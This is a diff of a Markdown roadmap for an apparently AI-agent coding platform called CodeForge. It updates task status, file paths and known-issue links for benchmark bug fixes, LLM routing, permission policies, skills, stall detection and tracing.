 - [x] 12B: LLM routing via LiteLLM tag-based scenario routing (6 scenarios)
 - [x] 12C: Role evaluation framework (FakeLLM harness, 9-role matrix, 15 fixtures)
 - [x] 12D-12F: RAG shared scopes, artifact-gated pipelines, pipeline templates (3 built-in)
@@ -127,11 +231,11 @@
 
 #### Phase 22 -- Planned Pattern Implementation (COMPLETED)
 - [x] All 8 patterns from CLAUDE.md: RouterLLM wiring, Copilot token exchange, composite memory scoring
-- [x] Experience pool (@exp_cache), HandoffMessage, Microagents, Skills system, Human Feedback Protocol
+- [x] Experience pool (@exp_cache), HandoffMessage, Microagents, Skills system, Human Feedback Protocol (open defects: [KI-15, KI-16, KI-57](#known-issues))
 
 #### Phase 23 -- Security & Identity Patterns (COMPLETED)
 - [x] 23A: Trust annotations (4 levels), auto-stamped on NATS payloads
-- [x] 23B: Message quarantine with risk scoring, admin review hold
+- [x] 23B: Message quarantine with risk scoring, admin review hold (bypassed for A2A and handoffs, see [KI-15](#known-issues))
 - [x] 23C: Persistent agent identity (fingerprint, stats accumulation, inbox)
 - [x] 23D: War Room -- live multi-agent collaboration view with swim lanes
 
@@ -148,10 +252,10 @@
 
 #### Phase 27 -- A2A Protocol Integration (COMPLETED)
 - [x] Full A2A v0.3.0 via a2a-go SDK -- server (inbound tasks) and client (outbound federation)
-- [x] AgentCard builder, auth middleware, task lifecycle, remote agent registry, `a2a://` handoff routing
+- [x] AgentCard builder, auth middleware, task lifecycle, remote agent registry, `a2a://` handoff routing (A2A API keys rejected by the global JWT middleware, see [KI-15](#known-issues))
 
 #### Phase 28 -- R2E-Gym / EntroPO Integration (COMPLETED)
-- [x] Hybrid verification pipeline (filter->rank), trajectory verifier (5-dimension LLM scoring)
+- [x] Hybrid verification pipeline (filter->rank), trajectory verifier (5-dimension LLM scoring; trajectory and logprob verifiers score 0.0 today, see [KI-37](#known-issues))
 - [x] Multi-rollout test-time scaling (best-of-N), diversity-aware MAB routing (entropy-UCB1)
 - [x] DPO/EntroPO trajectory export (JSONL), SWE-GEN synthetic task generation from Git history
 - [x] (2026-03-16) Evaluation improvements: logprob verifier, categorical trajectory scoring, longest/shortest selection strategies
@@ -175,7 +279,7 @@
 - [x] ConversationRunProvider for global run state, sidebar indicator, ChatPanel seamless resume
 
 #### OTEL Tracing Rewrite (COMPLETED)
-- [x] AgentNeo replaced with OpenTelemetry backend (OTLP gRPC exporter), 6 instrumented services
+- [x] AgentNeo replaced with OpenTelemetry backend (OTLP gRPC exporter), 6 instrumented services (export gaps, see [KI-36](#known-issues))
 
 #### QA Audit (COMPLETED)
 - [x] ~90 new handler tests across P0-P3 tiers, 33 duplicate test names renamed
@@ -197,7 +301,7 @@
 - [x] 7 bugs fixed: DB migration for rollout fields, cost population, NATS wiring, CSV export
 
 #### Benchmark Validation E2E Bug Fixes (COMPLETED)
-- [x] (2026-03-15) **Bug 1 — Score Key Mismatch (Medium):** Evaluator dimension names (`correctness`, `sparc_*`, `trajectory_*`) didn't match metric request names (`llm_judge`, `sparc`, `trajectory_verifier`). Added `_aggregate_metric_scores()` with `_DIMENSION_TO_METRIC` mapping (17 entries) in `workers/codeforge/consumer/_benchmark.py`. 16 tests in `workers/tests/test_score_key_normalization.py`.
+- [x] (2026-03-15) **Bug 1 — Score Key Mismatch (Medium):** Evaluator dimension names (`correctness`, `sparc_*`, `trajectory_*`) didn't match metric request names (`llm_judge`, `sparc`, `trajectory_verifier`). Added `aggregate_metric_scores()` with `_DIMENSION_TO_METRIC` mapping (now in `workers/codeforge/consumer/_benchmark_gemmas.py`). 16 tests in `workers/tests/test_score_key_normalization.py`.
 - [x] (2026-03-15) **Bug 2 — Stuck "running" Runs (High):** Runs with invalid params stayed `"running"` forever. Fix 2A: `StartRun()` returns error when dataset resolution fails and no suite fallback. Fix 2B: Watchdog goroutine scans every 5 min for runs stuck >15 min. Added `ErrorMessage` field to `Run` struct + DB migration `072`. Files: `internal/service/benchmark.go`, `internal/domain/benchmark/benchmark.go`, `internal/adapter/postgres/store_benchmark.go`, `cmd/codeforge/main.go`. 5 tests in `internal/service/benchmark_test.go`.
 - [x] (2026-03-15) **Bug 3 — Invalid Model Silently Succeeds (Medium):** LiteLLM fell back to default model. Added `_validate_model_exists()` checking `/v1/models` endpoint in `workers/codeforge/consumer/_benchmark.py`. 6 tests in `workers/tests/test_model_validation.py`.
 - [x] (2026-03-15) **Bug 4 — `model=auto` Without Routing (Low):** `_resolve_effective_llm()` silently passed `"auto"` to LiteLLM. Now raises `ValueError` when router unavailable. 2 tests in `workers/tests/test_model_validation.py`.
@@ -208,7 +312,7 @@
 
 #### Benchmark Validation E2E Round 2 — Bugs 6-10 + External Suite Fixes (COMPLETED)
 - [x] (2026-03-15) **Bug 6 — Agent Provider Wrong Kwarg (High):** `datasets_dir=` → `dataset_path=` in `_benchmark.py:405`
-- [x] (2026-03-15) **Bug 7 — Watchdog Timeout Too Short (High):** 15min → 2h default, configurable via `BENCHMARK_WATCHDOG_TIMEOUT` env var in `cmd/codeforge/main.go`
+- [x] (2026-03-15) **Bug 7 — Watchdog Timeout Too Short (High):** 15min → 2h default, configurable via `CODEFORGE_BENCHMARK_WATCHDOG_TIMEOUT` / `benchmark.watchdog_timeout` (`internal/config/loader.go`); since 2026-03-20 overridden per type (simple 30m, tool_use 1h, agent 4h), the global value only applies to runs without a type
 - [x] (2026-03-15) **Bug 8 — RolloutOutcome Missing eval_score (High):** Added `eval_score` field to `RolloutOutcome` dataclass in `multi_rollout.py`
 - [x] (2026-03-15) **Bug 9 — Wrong Attribute Name in _convert_rollout_outcome (High):** `outcome.execution.*` → `outcome.result.*` in `_benchmark.py:518-527`
 - [x] (2026-03-15) **Bug 10 — Hybrid Pipeline Passed as Regular Pipeline (Medium):** Separated pipeline construction, added `hybrid_pipeline` parameter
@@ -218,7 +322,7 @@
 - Results: Phase 3b external suites 4/5 PASS (LiveCodeBench partial due to HF server limitations), Phase 5 API 12/12 PASS, Phase 6 errors 2/5 PASS
 - Findings: `frontend/e2e/benchmark-validation/FINDINGS.md`
 
-#### Benchmark E2E Full Run (2026-03-19) — Findings & Recommendations (OPEN)
+#### Benchmark E2E Full Run (2026-03-19) — Findings & Recommendations (MOSTLY COMPLETED)
 
 > Report: `docs/testing/benchmark-e2e-report.md`
 > Full API + Playwright-MCP UI test. 86/90 passed, 4 deferred (queue timing).
@@ -231,20 +335,21 @@
 > (`MaxAckPending: 100`) but Python serializes everything. Tasks within a run are also sequential
 > (`runners/_base.py:run_tasks()` for-loop).
 
-- [ ] REC-1.1: Add `asyncio.Semaphore` to benchmark handler, spawn runs via `asyncio.create_task()` instead of inline `await`
+- [x] (2026-03-20, c42bf5a6) REC-1.1: Add `asyncio.Semaphore` to benchmark handler, spawn runs via `asyncio.create_task()` instead of inline `await`
   - File: `workers/codeforge/consumer/_benchmark.py`
-  - Config: `BENCHMARK_MAX_PARALLEL` env var (default 3)
+  - Config: `CODEFORGE_BENCHMARK_MAX_PARALLEL` env var (default 3, `workers/codeforge/config.py`)
   - Constraint: Agent `mount` mode runs sharing the same project workspace MUST NOT run in parallel (file corruption risk). Guard with per-project workspace lock or reject parallel mount runs to same project.
+  - [ ] Still open: per-project workspace lock (or rejection) for parallel mount-mode agent runs
   - Constraint: LLM rate limits are the real parallelism bottleneck — size semaphore based on provider capacity
   - Note: Each run already has its own `RunResult` — no shared mutable state between runs, safe to parallelize
-- [ ] REC-1.2: Add structured error handling for concurrent task failures
+- [x] (2026-03-20, c42bf5a6) REC-1.2: Add structured error handling for concurrent task failures
   - If a spawned task raises an exception, it must still publish `benchmark.run.result` with `status: "failed"` to NATS
   - Use `asyncio.create_task()` with an `add_done_callback` that catches and publishes errors
-- [ ] REC-1.3: Update `_message_loop` to support concurrent handlers
+- [x] (2026-03-20, c42bf5a6) REC-1.3: Update `_message_loop` to support concurrent handlers — solved inside the handler instead: the benchmark handler acks and returns immediately after spawning the run; `_message_loop` stays sequential
   - File: `workers/codeforge/consumer/__init__.py:271`
   - Current: `await handler(msg)` — blocks loop
   - Change: `asyncio.create_task(handler(msg))` — only for benchmark subject, other subjects (conversation, toolcall) remain sequential for ordering guarantees
-- [ ] REC-1.4: Add integration test verifying parallel execution
+- [ ] REC-1.4: Add integration test verifying parallel execution (only unit tests exist: `workers/tests/test_benchmark_parallel.py`)
   - Create 3 simple runs with different datasets simultaneously
   - Assert all 3 complete within ~1x single-run duration (not 3x)
   - Assert results are correct and don't interfere
@@ -255,7 +360,7 @@
 > Frontend LiveFeed logs errors + skips hydration for all visible running runs.
 > **Location:** `handlers_roadmap.go:444-455`
 
-- [ ] REC-2.1: Return empty result instead of 500 when `LoadTrajectory()` or `TrajectoryStats()` errors
+- [x] (2026-03-20) REC-2.1: Return empty result instead of 500 when `LoadTrajectory()` or `TrajectoryStats()` errors (run-not-found is not distinguished yet; it also returns 200 empty)
   - File: `internal/adapter/http/handlers_roadmap.go:444-455`
   - Fix: On error, set `page = &eventstore.TrajectoryPage{Events: []event.Event{}}` and `stats = &eventstore.TrajectoryStats{}`
   - Distinguish "run not found" (404) from "no events yet" (200 empty) if needed by checking run existence first
@@ -266,15 +371,16 @@
 > Client gets headers but zero-byte body. JSON format correctly returns `[]`.
 > **Location:** `handlers_benchmark.go:336-339`
 
-- [ ] REC-3.1: Add empty-check before JSONL loop, fall back to `[]` JSON response when no pairs exist
-  - File: `internal/adapter/http/handlers_benchmark.go:336-339`
+- [x] (2026-03-20) REC-3.1: Add empty-check before JSONL loop, fall back to `[]` JSON response when no pairs exist
+  - File: `internal/adapter/http/handlers_benchmark.go` (`ExportTrainingData`)
+- [ ] RLVR export (`ExportRLVRData`, `handlers_benchmark.go`) still writes a zero-byte JSONL body when there are no entries
 
 ##### REC-4: Suite Creation Should Auto-Derive Type from Provider (Low)
 
 > **Problem:** `POST /suites` requires explicit `type` field. Provider already implies type.
 > **Location:** `benchmark.go:86` — `r.Type.IsValid()` rejects empty type
 
-- [ ] REC-4.1: Add provider-to-type mapping, auto-derive in `RegisterSuite()` before `Validate()`
+- [x] (2026-03-20) REC-4.1: Add provider-to-type mapping, auto-derive in `RegisterSuite()` before `Validate()` (`benchmark.ProviderDefaultType()`, used in `internal/service/benchmark_suite.go`)
   - File: `internal/service/benchmark.go` (service layer), `internal/domain/benchmark/benchmark.go` (mapping)
   - Frontend: auto-populate type field in `SuiteManagement.tsx` on provider selection (nice-to-have)
 
@@ -283,13 +389,13 @@
 > **Problem:** Single global 2h watchdog. Simple runs stuck 2h before cleanup, agent runs on slow models killed prematurely.
 > **Location:** `cmd/codeforge/main.go` — watchdog goroutine, `internal/service/benchmark.go`
 
-- [ ] REC-5.1: Use benchmark type as heuristic timeout (no DB change needed)
+- [x] (2026-03-20) REC-5.1: Use benchmark type as heuristic timeout (no DB change needed) — `watchdogTimeoutForType()` in `internal/service/benchmark.go`
   - `simple` → 30 min, `tool_use` → 1h, `agent` → 4h
   - Or: add optional `timeout` field to `Suite` domain model + DB migration
 
 ---
 
-#### Benchmark E2E — Remaining Bugs (OPEN)
+#### Benchmark E2E — Remaining Bugs (COMPLETED 2026-03-16)
 
 > Discovered during E2E validation Round 2 (Phase 6 error scenarios).
 > Reference: `frontend/e2e/benchmark-validation/FINDINGS.md` → "Known Issues (Not Yet Fixed)"
@@ -469,6 +575,7 @@
 - [x] (2026-03-16) Skeleton design tokens (--cf-skeleton-base, --cf-skeleton-shine) for light/dark themes, registered in @theme
 - [x] (2026-03-16) ChatPanel: TypingIndicator replaces animate-pulse, StreamingCursor replaces static "Streaming..." label
 - [x] (2026-03-16) ResourceGuard: optional `skeleton` prop for custom loading states (backward-compatible)
+- Note (2026-03-18): ProgressBar, PacmanSpinner, SkeletonText, SkeletonChat, ResourceGuard and the keyframes cf-progress-slide / cf-pacman-chomp / cf-dot-orbit were removed as unused (c124162e); SkeletonCard and SkeletonTable were restored (47705a3f). Skeleton, TypingIndicator and StreamingCursor remain.
 
 #### Benchmark Metric Validation & Detail Card Fix (COMPLETED)
 - [x] (2026-03-16) **Go ValidMetrics allowlist gap:** Frontend offers 5 metrics (`correctness`, `tool_correctness`, `faithfulness`, `answer_relevancy`, `contextual_precision`) but Go `ValidMetrics` only had 9 entries — missing `tool_correctness`, `answer_relevancy`, `contextual_precision`. Runs with all metrics failed HTTP 400. Added 3 missing metrics to `internal/domain/benchmark/benchmark.go:180`. 29 Go tests pass.
@@ -482,10 +589,10 @@
 - [x] (2026-03-15) **Monaco Theme Sync:** Editor now reactively follows dark/light theme toggle via `createEffect` + `monaco.editor.setTheme()`. File: `CodeEditor.tsx`.
 - [x] (2026-03-15) **File Panel Icon Alignment:** Expand/Collapse-all SVG polyline points centered in 16x16 viewBox. File: `FilePanel.tsx`.
 - [x] (2026-03-15) **i18n: ~40 hardcoded strings replaced** across `FilePanel.tsx`, `FileContextMenu.tsx`, `GoalProposalCard.tsx`, `KnowledgeBasesPage.tsx`. 28 new keys in `en.ts` + `de.ts` (`files.*`, `common.approve`, `common.reject`, `detail.tab.files`).
-- [x] (2026-03-15) **"Allow Always" Policy Persistence:** `PermissionRequestCard.tsx` TODO resolved. Clicking "Allow Always" now approves the current tool call AND persists a permanent `allow` rule to the project's policy profile via `POST /api/v1/policies/allow-always`. Preset profiles are cloned to `{preset}-custom-{projectId}` on first use. Rule construction: tool name + first word of command as glob pattern (e.g., `Bash/git*`). Idempotent (duplicate rules detected via `HasRuleForSpecifier`). 26 new tests across domain, service, and HTTP layers. Files: `internal/domain/policy/policy.go`, `internal/service/policy.go`, `internal/service/project.go`, `internal/adapter/http/handlers.go`, `internal/adapter/http/routes.go`, `frontend/src/api/client.ts`, `frontend/src/features/project/PermissionRequestCard.tsx`, `frontend/src/features/project/ChatPanel.tsx`.
+- [x] (2026-03-15) **"Allow Always" Policy Persistence:** `PermissionRequestCard.tsx` TODO resolved. Clicking "Allow Always" now approves the current tool call AND adds an `allow` rule to the project's policy profile via `POST /api/v1/policies/allow-always` (in memory; written to disk only when a policy directory is configured, which `cmd/codeforge/main.go` does not do, see [KI-7](#known-issues)). Preset profiles are cloned to `{preset}-custom-{projectId}` on first use. Rule construction: tool name + first word of command as glob pattern (e.g., `Bash/git*`). Idempotent (duplicate rules detected via `HasRuleForSpecifier`). 26 new tests across domain, service, and HTTP layers. Files: `internal/domain/policy/policy.go`, `internal/service/policy.go`, `internal/service/project.go`, `internal/adapter/http/handlers_policy_crud.go`, `internal/adapter/http/routes.go`, `frontend/src/api/resources/settings.ts`, `frontend/src/features/project/PermissionRequestCard.tsx`, `frontend/src/features/project/ChatPanel.tsx`.
 
 #### Benchmark Live Feed (COMPLETED)
-- [x] (2026-03-10) Go: `TrajectoryEventPayload` in `events.go` — enriched WS broadcast with cost, tokens, input, output, step fields
+- [x] (2026-03-10) Go: `TrajectoryEventPayload` in `internal/domain/event/broadcast_payloads.go` — enriched WS broadcast with cost, tokens, input, output, step fields
 - [x] (2026-03-10) Go: Runtime trajectory subscription handler broadcasts enriched payload
 - [x] (2026-03-10) TypeScript: `LiveFeedEvent` + `BenchmarkLiveProgress` types in `api/types.ts`
 - [x] (2026-03-10) Frontend: `BenchmarkLiveFeed.tsx` — virtualized auto-scrolling feed with `@tanstack/solid-virtual`, feature accordions, progress header, elapsed timer
@@ -519,7 +626,7 @@
 - [x] Benchmark E2E: 132 browser Playwright tests across 12 spec files
 - [x] Benchmark Validation E2E: 22 API-level tests across 7 blocks (`frontend/e2e/benchmark-validation/`)
 - [x] Backend E2E: 88 pass / 0 fail / 3 skip (97% pass rate)
-- [x] Python unit tests: 134 pass (107 prior + 27 new from evaluation improvements)
+- [x] Python unit tests: 134 pass as of 2026-03-16 (107 prior + 27 new from evaluation improvements); the suite has since grown to ~140 test files / ~2,400 test functions
 
 #### Chat Enhancements (COMPLETED)
 - [x] (2026-03-10) Phase 1: HITL permission UI + `supervised-ask-all` preset + autonomy-to-preset mapping
@@ -530,7 +637,7 @@
 - [x] (2026-03-10) Phase 6: Slash commands (/compact, /rewind, /clear, /help, /mode, /model)
 - [x] (2026-03-10) Phase 7: Conversation full-text search with PostgreSQL FTS (GIN index, ts_rank)
 - [x] (2026-03-10) Phase 8: Notification center with browser push, sound, tab badge, AG-UI wiring
-- [x] (2026-03-10) Phase 9: Real-time channels with threads, domain model, sidebar integration
+- [x] (2026-03-10) Phase 9: Real-time channels with threads, domain model, sidebar integration (channel WS events are never broadcast, see [KI-42](#known-issues))
 - [x] (2026-03-10) Phase 10+11: Feature spec + documentation updates
 - Feature spec: [docs/features/05-chat-enhancements.md](features/05-chat-enhancements.md)
 
@@ -597,11 +704,11 @@
 > failed without trying another provider. Rate tracker only handles 429 (rate limit), not
 > 401/402/billing errors.
 
-- [ ] F3.1: Add test for billing/auth error classification — 4 tests (2026-03-09)
-  - File: `workers/tests/test_routing_rate_tracker.py` (File absorbed into other test files — not yet created as standalone)
+- [x] F3.1: Add test for billing/auth error classification (2026-03-09)
+  - File: `workers/tests/test_routing_error_classification.py` (billing/auth exhaustion and cooldown tests; no standalone `test_routing_rate_tracker.py`)
   - Test: Call `rate_tracker.record_error("anthropic", error_type="billing")` → `is_exhausted("anthropic")` returns `True`
   - Test: Call `rate_tracker.record_error("anthropic", error_type="auth")` → `is_exhausted("anthropic")` returns `True`
-  - Run: `cd workers && poetry run pytest tests/test_routing_rate_tracker.py -v`
+  - Run: `cd workers && poetry run pytest tests/test_routing_error_classification.py -v`
 
 - [x] F3.2: Add `record_error()` to `RateLimitTracker` with billing/auth cooldowns (2026-03-09)
   - File: `workers/codeforge/routing/rate_tracker.py`
@@ -642,7 +749,7 @@
   - Run: `cd workers && poetry run pytest tests/test_tool_message_compat.py -v`
 
 - [x] (2026-03-10) F6.2: Add `sanitize_tool_messages()` normalizer in `agent_loop.py`
-  - File: `workers/codeforge/agent_loop.py`
+  - File: `workers/codeforge/loop_helpers.py` (moved out of `agent_loop.py` in the 2026-03-24 decomposition)
   - Ensures all `role:tool` messages have `content` (defaults to `""`) and `tool_call_id`
   - Also fixed `_payload_to_dict()` to always include `content` for `role:tool` messages
 
@@ -833,7 +940,7 @@
 #### Task 10: Python `create_skill` Tool (Priority: HIGH)
 - [x] T10.1: Write tests for validation, draft save, injection rejection, content length limit (2026-03-09)
   - File: `workers/tests/test_tool_create_skill.py`
-- [x] T10.2: Implement CreateSkillTool with validation, regex safety check, DB save as draft (2026-03-09)
+- [x] T10.2: Implement CreateSkillTool with validation, regex safety check, DB save as draft (2026-03-09) (the save fails today, see [KI-58](#known-issues))
   - File: `workers/codeforge/tools/create_skill.py`
 - [x] T10.3: Register in `build_default_registry()` (2026-03-09)
 - [x] T10.4: Run tests — all pass (2026-03-09)
@@ -867,14 +974,14 @@
 
 #### Task 14: Go Import Handler — HTTP endpoint (Priority: MEDIUM)
 - [x] T14.1: Implement `POST /api/v1/skills/import` handler (URL fetch, format detect, safety score, save) (2026-03-09)
-  - File: `internal/adapter/http/handlers_skill_import.go`
+  - File: `internal/adapter/http/handlers_agent_features.go` (`ImportSkill`)
 - [x] T14.2: Add route to `routes.go` (2026-03-09)
 - [x] T14.3: Write handler tests (2026-03-09)
 - [x] T14.4: Commit (2026-03-09)
 
 #### Task 15: WebSocket Skill Draft Notification (Priority: LOW)
-- [x] T15.1: Add `SkillDraftEvent` struct to `internal/adapter/ws/events.go` (2026-03-09)
-- [x] T15.2: Emit WebSocket event when agent creates a skill draft (via NATS → Go → WS broadcast) (2026-03-09)
+- [x] T15.1: Add `SkillDraftEvent` struct (2026-03-09) — now in `internal/domain/event/broadcast_payloads.go`
+- [ ] T15.2: Emit `skill.draft` WebSocket event when the agent creates a skill draft (type and constant exist in `internal/domain/event`, no emitter or frontend listener yet)
 - [x] T15.3: Commit (2026-03-09)
 
 #### Task 16: Documentation and Exports (Priority: LOW)
@@ -893,10 +1000,10 @@
 #### Feature Activation Sweep (COMPLETED)
 - [x] (2026-03-09) Activate Context Optimizer by default (ContextEnabled=true in Go config)
 - [x] (2026-03-09) Add 16 missing env-var bindings in loader.go (agent context, quarantine, LSP, review router, copilot, routing, experience)
-- [x] (2026-03-09) Add tenant_id to ConversationRunStartPayload (Go NATS + Python Pydantic) for Experience Pool isolation
+- [x] (2026-03-09) Add tenant_id to ConversationRunStartPayload (Go NATS + Python Pydantic) for Experience Pool isolation (the worker pool still uses the zero tenant, see [KI-16](#known-issues))
 - [x] (2026-03-09) Add max_entries eviction logic to Experience Pool store()
 - [x] (2026-03-09) Integrate Experience Pool into AgentLoopExecutor (pre-loop cache check + post-loop store)
-- [x] (2026-03-09) Enable OpenTelemetry tracing with Jaeger collector in codeforge.yaml
+- [x] (2026-03-09) Jaeger collector in `docker-compose.yml`; OTEL tracing is opt-in (`otel.enabled`, default false; enable it in your local `codeforge.yaml`, see [KI-36](#known-issues))
 - [x] (2026-03-09) Fix routing default inconsistency (config.py default aligned to True)
 - [x] (2026-03-09) Documentation updates (env vars in dev-setup.md, experience pool in agent-orchestration.md)
 
@@ -944,7 +1051,7 @@
 
 #### Codebase Optimization -- Full Overhaul (COMPLETED)
 - [x] (2026-03-08) Go: Deleted duplicate `internal/crypto/crypto/aes.go` (byte-for-byte copy)
-- [x] (2026-03-08) Go: Generic `scanRows[T]`, `writeJSONList[T]`, `queryParamInt` helpers in `internal/adapter/postgres/helpers.go`
+- [x] (2026-03-08) Go: Generic `scanRows[T]` in `internal/adapter/postgres/helpers.go`, `writeJSONList[T]` and `queryParamInt` in `internal/adapter/http/helpers.go`
 - [x] (2026-03-08) Go: Migrated 27 store files from manual `for rows.Next()` to `scanRows()` (~350 lines removed)
 - [x] (2026-03-08) Go: Migrated ~14 handler files from manual `strconv.Atoi` to `queryParamInt()` and `writeJSONList()`
 - [x] (2026-03-08) Go: Removed duplicate `nilIfEmpty()` in `store_benchmark.go`, consolidated to `nullIfEmpty()` in helpers
@@ -968,7 +1075,7 @@
 
 #### Pillar 1: Project Dashboard
 
-- [x] (2026-03-09) Implement GitHub adapter with OAuth flow -- domain model, state store, service, HTTP handlers, `github-api` git provider, frontend OAuth connect button
+- [x] (2026-03-09) Implement GitHub adapter with OAuth flow -- domain model, state store, service, HTTP handlers, `github-api` git provider, frontend OAuth connect button (OAuth service never wired, `/api/v1/auth/github` returns 501, see [KI-55](#known-issues))
 - [x] (2026-03-09) Verify GitHub adapter compatibility with Forgejo/Codeberg -- provider aliases, variant config, detection, tests
 - [x] (2026-03-09) Batch operations across selected repos -- batch API endpoints, store methods, frontend multi-select UI
 - [x] (2026-03-09) Cross-repo search (code, issues) -- Go aggregation endpoint, frontend SearchPage with debounced input + project filter
@@ -985,7 +1092,7 @@
 
 > Design: [docs/specs/2026-03-08-integration-testing-design.md](specs/2026-03-08-integration-testing-design.md)
 > Goal: Verify that all 30 major features work together across Go, Python, and Frontend layers.
-> Tracking: [docs/feature-verification-matrix.md](feature-verification-matrix.md)
+> Tracking: `scripts/verify-features.sh` (prints the matrix to stdout, JSON summary in `/tmp/verification-summary.json`; `docs/feature-verification-matrix.md` is not created yet)
 
 #### B1: Fix Broken Foundation Tests (Priority: CRITICAL) -- DONE 2026-03-08
 
@@ -1019,7 +1126,7 @@
 - [x] Create reverse contract test -- Python roundtrip (Pydantic parse → dump → re-parse)
 - [x] Add contract test verification checklist -- field coverage, required fields, tenant_id presence
 
-**All 20 NATS payload types covered:**
+**NATS payload contract coverage (20 of 24 listed subjects; `memory.*` and `handoff.request` still missing):**
 
 - [x] Contract test: `conversation.run.start` -- PASS
 - [x] Contract test: `conversation.run.complete` -- PASS
@@ -1123,7 +1230,7 @@
 - [x] (2026-03-09) Upload verification matrix as CI artifact after smoke tests
 - [x] (2026-03-09) Add CI status badge to README
 
-#### C1: Feature Verification Matrix (Priority: MEDIUM) -- DONE 2026-03-08
+#### C1: Feature Verification Matrix (Priority: MEDIUM) -- OPEN (file not created; `scripts/verify-features.sh` prints the matrix to stdout)
 
 > File: `docs/feature-verification-matrix.md` (File not yet created)
 
@@ -1158,6 +1265,9 @@
   - `--trend` flag displays last 20 runs summary + per-feature trend across last 5 runs
 
 #### Phase 31 -- Contract-First Review/Refactor (COMPLETED)
+
+> **Implementation status (2026-09-29):** the components below exist, but the pipeline is not wired: `ReviewTriggerService` gets a nil orchestrator, `DiffImpactScorer` has no caller and RefactorApproval listens for the wrong event. See [KI-17](#known-issues).
+
 - [x] Boundary domain model (ProjectBoundaryConfig, BoundaryFile) -- 2026-03-15
 - [x] Plan domain: waiting_approval step status -- 2026-03-15
 - [x] DB migrations (073 project_boundaries, 074 review_triggers) -- 2026-03-15
@@ -1172,7 +1282,7 @@
 - [x] Orchestrator: waiting_approval status handling (approve/reject) -- 2026-03-15
 - [x] HTTP endpoints: boundaries CRUD, review trigger, run approval -- 2026-03-15
 - [x] Python NATS consumer: review trigger handler -- 2026-03-15
-- [x] Frontend: RefactorApproval HITL UI + BoundariesPanel -- 2026-03-15
+- [x] Frontend: BoundariesPanel; RefactorApproval component exists but is not functional (event name/payload mismatch with `review.approval_required`, unauthenticated fetch, see [KI-17](#known-issues)) -- 2026-03-15
 - [x] Integration wiring: services in main.go + autoIndex trigger -- 2026-03-15
 
 #### Project Workflow Redesign (COMPLETED -- 2026-03-09)
@@ -1246,7 +1356,7 @@
 - [x] 32H.3: Write database migration 075_add_message_images.sql (2026-03-18)
 - [x] 32H.4: Update message store to read/write images JSONB (2026-03-18) — `store_conversation.go`
 - [x] 32H.5: Write failing Go test -- NATS payload with images (2026-03-18)
-- [x] 32H.6: Add MessageImagePayload to NATS schema (2026-03-18) — `schemas.go:453-468`
+- [x] 32H.6: Add MessageImagePayload to NATS schema (2026-03-18) — `internal/port/messagequeue/schemas_conversation.go`
 - [x] 32H.7: Update historyToPayload to propagate images (2026-03-18) — `conversation_agent.go:863-869`
 - [x] 32H.8: Run full Go test suite -- no regressions (2026-03-18)
 
@@ -1328,7 +1438,7 @@
 
 **A1: Stall Detection + Escape** -- COMPLETED (2026-03-18)
 - [x] A1.1-A1.4: Write 22 stall detection tests (identical calls, args hash, escape injection, double-stall abort, edge cases)
-- [x] A1.5: Implement `StallDetector` class in `workers/codeforge/agent_loop.py` (~50 lines, deque-based sliding window)
+- [x] A1.5: Implement `StallDetector` class (~50 lines, deque-based sliding window) — now in `workers/codeforge/stall_detection.py`
 - [x] A1.6: Integrate into `AgentLoopExecutor.run()` with `_check_stall()` helper (cyclomatic complexity managed)
 - [x] A1.7: Publish `trajectory.stall_detected` event via `_runtime.publish_trajectory_event()`
 - [x] A1.8: 60/60 tests pass (22 new + 33 existing agent loop + 5 related)
@@ -1351,7 +1461,7 @@
 
 **A3: Plan/Act Mode Toggle (~5h)** -- DONE 2026-03-18
 - [x] A3.1-A3.5: Write plan/act tests (tool restriction, phase transition, max iterations, autonomy, routing tags) -- 29 Python + 8 Go tests
-- [x] A3.6: Add `plan_act_enabled` to NATS payload (`schemas.go` + `models.py`)
+- [x] A3.6: Add `plan_act_enabled` to NATS payload (`internal/port/messagequeue/schemas_conversation.go` + `models.py`)
 - [x] A3.7: Set `plan_act_enabled` based on `modeAutonomy >= 4` in dispatcher (`conversation_agent.go`)
 - [x] A3.8: Implement `PlanActController` class in `workers/codeforge/plan_act.py`
 - [x] A3.9: Integrate into `run()` and `_do_llm_iteration()` in `agent_loop.py`
@@ -1386,17 +1496,17 @@
 
 **C1: Routing Transparency + Mid-Loop Model Switching (COMPLETED 2026-03-18)**
 - [x] (2026-03-18) C1.1-C1.4: Write routing transparency + quality signal + model switch tests — 7 new tests in `test_routing_transparency.py`
-- [x] (2026-03-18) C1.5: `route_with_metadata()` on `HybridRouter` — `router.py:133`, returns `RoutingMetadata`
-- [x] (2026-03-18) C1.6: `IterationQualityTracker` class — `agent_loop.py:857`, integrated into `run()` at line 310
+- [x] (2026-03-18) C1.5: `route_with_metadata()` on `HybridRouter` — `workers/codeforge/routing/router.py`, returns `RoutingMetadata`
+- [x] (2026-03-18) C1.6: `IterationQualityTracker` class — now in `workers/codeforge/quality_tracking.py`, integrated into `run()`
 - [x] (2026-03-18) C1.7: Wired `route_with_metadata()` into agent loop via `RoutingResult.routing_metadata` → `LoopConfig` → `_publish_routing_decision()` trajectory event
 - [x] (2026-03-18) C1.8: 132/132 tests pass (23 routing + 33 agent loop + 67 routing/fallback + 34 consumer dispatch), zero regressions
 
 **A4: Inference-Time Scaling for Conversations (COMPLETED 2026-03-18)**
 - [x] (2026-03-18) A4.1-A4.5b: 27 rollout tests in `test_conversation_rollout.py` (single, multi, selection, early stopping, cost, non-git fallback, snapshot/restore, clamping, trajectory metadata)
-- [x] (2026-03-18) A4.6: `rollout_count` in Go NATS payload (`schemas.go:495`) + Python `ConversationRunStartMessage` (`models.py:488`)
+- [x] (2026-03-18) A4.6: `rollout_count` in Go NATS payload (`internal/port/messagequeue/schemas_conversation.go`) + Python `ConversationRunStartMessage` (`models.py:488`)
 - [x] (2026-03-18) A4.7: `Agent.ConversationRolloutCount` config (`config.go:151`), env var `CODEFORGE_AGENT_CONVERSATION_ROLLOUT_COUNT`, default 1
-- [x] (2026-03-18) A4.8: `ConversationRolloutExecutor` (`agent_loop.py:1003`) with `EarlyStopChecker`, non-git fallback
-- [x] (2026-03-18) A4.9: `_snapshot_workspace()` (`agent_loop.py:919`) + `_restore_workspace()` (`:935`) via git stash
+- [x] (2026-03-18) A4.8: `ConversationRolloutExecutor` (`agent_loop.py`) with `EarlyStopChecker`, non-git fallback
+- [x] (2026-03-18) A4.9: `_snapshot_workspace()` + `_restore_workspace()` (`agent_loop.py`) via git stash
 - [x] (2026-03-18) A4.10: NATS consumer dispatch wired — `rollout_count > 1` triggers `ConversationRolloutExecutor` in `_conversation.py:279-290`, clamped `max(1, min(count, 8))`
